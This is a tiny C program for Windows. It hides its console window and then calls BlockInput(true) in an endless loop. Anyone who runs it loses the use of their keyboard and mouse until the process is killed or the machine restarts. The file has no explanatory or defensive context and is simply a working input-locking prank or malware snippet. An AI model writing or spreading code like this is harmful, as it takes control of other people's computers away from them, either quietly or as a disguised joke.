#include <windows.h>
#include <Winable.h>

int main()
{
    FreeConsole();
    while(1)
    {
        BlockInput(true);
    }
}

